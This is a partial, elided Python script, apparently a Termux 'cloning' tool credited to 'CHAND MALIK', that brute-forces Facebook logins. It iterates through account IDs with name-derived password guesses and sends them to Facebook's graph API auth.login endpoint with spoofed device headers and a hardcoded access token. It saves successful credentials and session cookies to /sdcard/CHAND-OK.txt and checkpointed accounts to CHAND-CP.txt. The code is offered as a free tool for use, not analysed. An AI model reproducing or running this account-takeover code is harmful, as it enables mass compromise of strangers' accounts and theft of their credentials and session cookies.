...
\033[1;97m[+]\033[1;91m    FACEBOOK \033[1;90m: \033[1;92mCHAND.MALIK
\033[1;97m[+]\033[1;91m    GITHUB \033[1;90m: \033[1;92m  CHANDMALIK
\033[1;97m====================================================
\x1b[31;1m   \x1b[47;2m[ THIS TOOL IS FREE ]\x1b[00;1m\x1b[31;1m \x1b[31;1m \x1b[47;2m[ POWERED BY CHAND AFRIDI ]\x1b[00;1m\x1b[31;1m
\033[1;97m====================================================
\033[1;97m===============================================================
...
def method():
    ...
    print(f"{oo('•')} FILE SAVE IN /sdcard/CHAND-OK.txt")
    print('\033[1;89m='*63)
    print()
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mCHAND-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mCHAND-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m|\033[1;92m '+pword+'  ')
                open('/sdcard/CHAND-OK.txt','a').write(f'{acc} | {pword}\n')
                if c=='y':
                    try:
                           ...
                           print(cookies)
                           open('/sdcard/CHAND-OK.txt','a').write(f'sb={ssbb};{ckkk}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;93mCHAND-CP\033[1;91m] \033[1;93m'+acc+' \033[1;91m|\033[1;93m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/CHAND-CP.txt','a').write(f'{acc} | {pword}\n')
                break
            else:
                continue
        loop += 1
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mCHAND-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = "Mozilla/5.0 (Linux; Android 10; Infinix X605 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/357.0.0.12.72;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": AHMAD_ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
...
def andom():
    ...
    print(f"{oo('•')}/sdcard/CHAND-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mCHAND-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/CHAND-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mCHAND-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/CHAND-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
